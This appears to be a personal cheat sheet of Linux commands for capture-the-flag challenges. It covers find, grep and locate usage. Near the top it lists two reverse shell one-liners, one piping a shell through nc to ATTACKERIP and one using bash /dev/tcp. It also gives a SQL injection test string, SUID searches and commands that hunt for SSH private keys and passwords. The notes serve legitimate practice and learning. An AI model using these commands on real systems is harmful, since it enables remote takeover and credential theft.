---
dg-publish: true
---

I hope to grow this list over time as I do more challenges and learn more useful commands 

- #### Reverse Shells
	`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKERIP 4444 >/tmp/f" >> /file/you/want/appended`

	`bash -i >& /dev/tcp/192.168.133.226/4444 0>&1`

- #### Secure Copy 
	`scp -p PORT file.txt username@remoteIP:/folder/location`

- #### Check sudo permissions
	- `sudo -l`

- #### Extract .tar file
	- `tar -xzf /path/to/file`

- #### SQL Injection Test
	- `'admin' OR '1'='1' --`

- #### Find Usage
	- General Usage
		- `find / -name "id_rsa" 2>/dev/null`
	-  Find all .conf files under /etc
		- `find /etc -name "*.conf" -type f 2>/dev/null
	- Find all directories named "backup" anywhere
		- `find / -name "backup" -type d 2>/dev/null`
	- The ? wildcard matches exactly one character
		- `find /var/log -name "syslog.?" -type f 2>/dev/null
	- ```
	  # By name (case-insensitive)
	  find / -iname "*.bak" 2>/dev/null
	  
	  # By file type
	  find /home -type f         # Regular files only
	  find /home -type d         # Directories only
	  find /home -type l         # Symbolic links only
	  
	  # By permissions (security-critical)
	  find / -perm -4000 -type f 2>/dev/null    # SUID binaries
	  find / -perm -2000 -type f 2>/dev/null    # SGID binaries
	  find / -perm -o+w -type f 2>/dev/null     # World-writable files
	  
	  # By owner
	  find / -user root -perm -4000 2>/dev/null # SUID binaries owned by root
	  find /home -user www-data 2>/dev/null     # Files owned by web server
	  
	  # By modification time
	  find /var/log -mtime -1    # Modified in the last 24 hours
	  find /tmp -mmin -30        # Modified in the last 30 minutes
	  find / -newer /etc/passwd 2>/dev/null  # Modified after /etc/passwd
	  
	  # By size
	  find / -size +100M 2>/dev/null    # Files larger than 100 MB
	  find /tmp -empty                   # Empty files and directories
	  
	  ### Essential find commands
	  find / -name "id_rsa" 2>/dev/null           # SSH private keys
	  find / -name "*.conf" -type f 2>/dev/null    # Configuration files
	  find / -perm -4000 -type f 2>/dev/null       # SUID binaries
	  find / -perm -o+w -type f 2>/dev/null        # World-writable files
	  find / -user root -perm -4000 2>/dev/null    # Root-owned SUID
	  find /var/log -mtime -1                      # Modified last 24h
	  find /tmp -mmin -30                          # Modified last 30 min
	  find / -name "*.bak" -o -name "*.old" 2>/dev/null  # Backup files
	  
	  ```
- The `-perm -4000` search is one of the first commands in any Linux privilege escalation checklist. SUID binaries run with the permissions of the file owner (usually root), and a misconfigured SUID binary is often the fastest path from a regular user account to root.

- #### Search Inside Files (grep)
	- ``` grep
		# Search for "bash" in /etc/passwd
		grep "bash" /etc/passwd

		# Show line numbers with -n
		grep -n "bash" /etc/passwd

		# Case-insensitive search with -i
		grep -i "error" /var/log/syslog
		
		# Core flags
		grep -r "pattern" /path     # Recursive search
		grep -i "pattern" file      # Case-insensitive
		grep -n "pattern" file      # Show line numbers
		grep -l "pattern" /path/*   # Show only filenames
		grep -v "pattern" file      # Invert: show non-matching lines
		grep -c "pattern" file      # Count matches
		
		# Context flags (show surrounding lines)
		grep -A 3 "error" logfile   # Show 3 lines After each match
		grep -B 2 "error" logfile   # Show 2 lines Before each match
		grep -C 5 "error" logfile   # Show 5 lines of Context (before + after)
		
		# Combining flags for security work
		grep -rni "password" /etc/ 2>/dev/null # Recursive, case-insensitive, line numbers
		grep -rl "BEGIN RSA PRIVATE" /home/ 2>/dev/null  # Find files containing private keys
		
		### Essential grep commands ###
		grep -rni "password" /etc/ 2>/dev/null       # Passwords in configs
		grep -rl "BEGIN.*PRIVATE KEY" /home/         # Private key files
		grep "Failed password" /var/log/auth.log     # Failed SSH logins
		grep "Accepted password" /var/log/auth.log   # Successful logins
		grep -v "^#" /etc/ssh/sshd_config            # Active SSH config
		grep -E "password|secret|key" file           # Multiple patterns
		grep -C 5 "error" /var/log/syslog            # Errors with context
		```
- #### Search Recursively
	- ``` Recursive_Search
		# Search all files under /etc for the word "password"
		grep -r "password" /etc/ 2>/dev/null

		# Show only filenames that contain matches (-l flag)
		grep -rl "password" /etc/ 2>/dev/null

		# Invert the match: show lines that do NOT contain a pattern
		grep -v "^#" /etc/ssh/sshd_config
		```
- #### Combining `find` and `grep`
	- Find all .conf files, then search each one for "password"
		- `find /etc -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
	- Same result using a pipe and xargs
		- `find /etc -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
	- Find PHP files containing database credentials
		- `find /var/www -name "*.php" -exec grep -l "DB_PASS\|db_password" {} \; 2>/dev/null`

- #### Locate: Instant Lookups from an Index
- ``` Locate
  # Update the database (requires root on most systems)
  sudo updatedb
  
  # Search for files by name
  locate id_rsa
  locate "*.conf"
  
  # Case-insensitive search
  locate -i "readme"
  
  # Count matches instead of listing them
  locate -c "*.log"
```
  

